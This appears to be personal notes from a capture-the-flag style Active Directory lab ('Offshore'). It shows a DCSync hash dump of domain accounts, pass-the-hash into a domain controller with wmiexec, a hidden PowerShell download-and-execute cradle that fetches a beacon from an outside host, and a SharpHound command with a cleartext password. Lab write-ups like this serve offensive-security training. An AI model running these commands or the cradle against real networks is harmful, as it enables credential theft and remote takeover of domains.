

utilized [[All the way back around]] to dump hashes due to `cybr_adm` having rights to `DCSYNC`


`secretsdump.py` #dcsync
```bash
┌──(root💀gobots)-[02Jan2024 13:50:26]-[/usr/share/doc/python3-impacket/examples]                                                                                                                           
└─# proxychains python3 secretsdump.py -just-dc cyber_adm:bugs_b3_hacking_u@172.16.1.5                                                                                                                      
[proxychains] config file found: /etc/proxychains4.conf                                                                                                                                                     
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                                                                                                                      
Impacket v0.11.0 - Copyright 2023 Fortra                                                                                                                                                                    
                                                                                                                                                                                                            
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                               
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                                        
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0109d7e72fcfe404186c4079ba6cf79c:::                                                                                                                      
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cba2ed22077aa56ae957bcf43a8d82f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
bob:1110:aad3b435b51404eeaad3b435b51404ee:b38c126d0faabc61362ecc83ccb0cd08:::
joe:1111:aad3b435b51404eeaad3b435b51404ee:fde396caf28acc233207b2706483024f:::
bill:1113:aad3b435b51404eeaad3b435b51404ee:47b4d6012d7dcf231d8533758231c80d:::
salvador:1114:aad3b435b51404eeaad3b435b51404ee:bcee59fae528be44811e1b91ce3a8c35:::
lazy_admin:1119:aad3b435b51404eeaad3b435b51404ee:d168f91992f800743144f24518de5f2b:::
vincent.delpy:1120:aad3b435b51404eeaad3b435b51404ee:f5e7702e1032710f9f16ef8a691da861:::
iamtheadministrator:1122:aad3b435b51404eeaad3b435b51404ee:70016778cb0524c799ac25b439bd67e0:::
justalocaladmin:1603:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::
corp.local\GStephenson:1604:aad3b435b51404eeaad3b435b51404ee:a6c9bca7e1f4076c538ff6e7096d59be:::
corp.local\AMountgarrett:1605:aad3b435b51404eeaad3b435b51404ee:4b76b38df5e9adf9739c8f43869d91ce:::
corp.local\JHann:1606:aad3b435b51404eeaad3b435b51404ee:1d863479e1ab3bd62a2bfafa1abaa2dd:::
corp.local\LBellantoni:1607:aad3b435b51404eeaad3b435b51404ee:2c019748d27c982f3be03c378759a954:::
corp.local\LGresham:1608:aad3b435b51404eeaad3b435b51404ee:520d2dcba9759412cda4eeeb524e5407:::
corp.local\EReynolds:1609:aad3b435b51404eeaad3b435b51404ee:bb413fd4eab36d867ae30ca134911ef6:::
corp.local\MTorres:1610:aad3b435b51404eeaad3b435b51404ee:a1e69cd82485430ad9f732a7673b0732:::
corp.local\OCollier:1611:aad3b435b51404eeaad3b435b51404ee:9e5c6bcd86c00d97c22f8630be9e4f35:::
corp.local\KSteele:1612:aad3b435b51404eeaad3b435b51404ee:4192316432ae3c0b0e9c948d494e64fa:::
corp.local\LMacghey:1613:aad3b435b51404eeaad3b435b51404ee:35fb7b7d541ed4fee611fbefe89707c6:::
corp.local\FFigueroa:1614:aad3b435b51404eeaad3b435b51404ee:d365fa7447d7cf17e62ba4758b67632e:::
corp.local\RFord:1615:aad3b435b51404eeaad3b435b51404ee:ece851cce21d0092e2d1e61537dd351e:::
corp.local\LPotter:1616:aad3b435b51404eeaad3b435b51404ee:6ded62367988f54d2d562621d6532051:::
corp.local\SYoung:1617:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
corp.local\BMoore:1618:aad3b435b51404eeaad3b435b51404ee:65d8f7784ce4eed6b2c1a028c4e54866:::
corp.local\ZWootten:1619:aad3b435b51404eeaad3b435b51404ee:561d7ee942fadd19101ccdb0a5fde05a:::
corp.local\SBradshaw:1620:aad3b435b51404eeaad3b435b51404ee:c377ac42a9918b3ccda3f1585484665a:::
corp.local\DDavis:1621:aad3b435b51404eeaad3b435b51404ee:027dcae638b664716cdc075fa4cbc493:::
corp.local\EMoulds:1622:aad3b435b51404eeaad3b435b51404ee:916c1dbf6a2a698bfbb4104d3fe55974:::
```
once we were able to dump the `iamadministrator` hashes from `DC01` we essentially own the network, these domain administrator hashes are able to be utilized anywhere in the domain
```powershell
┌──(root💀gobots)-[03Jan2024 13:55:24]-[/usr/share/doc/python3-impacket/examples]
└─# proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:70016778cb0524c799ac25b439bd67e0 CORP.LOCAL/iamtheadministrator@172.16.1.5
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
corp\iamtheadministrator
```
![[Pasted image 20240103135838.png]]

# Flag:

```powershell
C:\USers\iamtheadministrator\Desktop>type flag.txt
OFFSHORE{r3pl1cation_@ll0w_l1st}
```
![[Pasted image 20240103135932.png]]

utilized `DA` hashes on [[My my, what do we have here]]


Once `CORP.LOCAL` domain is owned looking back at bloodhound.

`CORP.LOCAL` is trusted by `DEV.ADMIN.OFFSHORE.COM` this is the next step.
![[Pasted image 20240104103102.png]]

# Getting a DC01 Beacon

setup a `scripted web delivery` listener
![[Pasted image 20240104104614.png]]
copy the string `powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.14.39:80/a'))"` and throw it in the `DC01` `wmiexec.py` shell

![[Pasted image 20240104104747.png]]
on as `DC01` beacon
![[Pasted image 20240104104855.png]]




# Pulling a new Bloodhound from DC01

--domain  <DEV.ADMIN.OFFSHORE.COM> 



```powershell
execute-assembly /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe -c all --ldapusername bill --ldappassword "I like to map Shares!" --domain DEV.ADMIN.OFFSHORE.COM
```